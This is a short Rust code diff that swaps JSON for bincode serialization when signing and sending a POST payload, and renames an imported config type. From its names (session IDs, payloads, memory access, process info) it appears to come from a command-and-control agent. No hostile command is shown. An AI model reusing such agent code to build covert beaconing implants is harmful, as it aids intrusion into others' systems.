@@ -6,7 +6,7 @@ use crate::link_util::get_domain_name;
 use crate::link_util::process_name_and_parent;
 use crate::link_util::process_path;
 use crate::link_util::working_dir;
-use crate::poollink::Advanced;
+use crate::poollink::Adv;
 use crate::rundata::RunData;
 use crate::link_util::read_file;
 use crate::memory::access_memory;
@@ -52,7 +52,7 @@ impl Lk {
     pub fn fetch_config(
         &self,
         config: &CCC,
-        advanced: &Advanced,
+        advanced: &Adv,
         link_nb: i32,
         session_id: &String,
         //running_thread: &Vec<Payload>,
@@ -553,13 +553,15 @@ impl LinkFetch for LHP {
             sign_bytes: vec![],
         };
 
-        let sign_data: String = format!("{}", serde_json::to_string(&post_data).unwrap_or_default());
-        let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
+        // TODO aie aie
+        //let sign_data: String = format!("{}", serde_json::to_string(&post_data).unwrap_or_default());
+        let sign_data = bincode::serialize(&post_data)?;
+        let sig: signature::Signature = key_pair.sign(&sign_data);
         let sign_bytes = sig.as_ref().to_vec();
         post_data.peer_public_key_bytes = peer_public_key_bytes;
         post_data.sign_bytes = sign_bytes;
 
-        let post_data_bytes = serde_json::to_vec(&post_data)?;
+        let post_data_bytes: Vec<u8> = bincode::serialize(&post_data)?;
         let m: Vec<u8> =
             apply_all_dataoperations(&mut self.dataoperation_post.clone(), post_data_bytes)?;
 
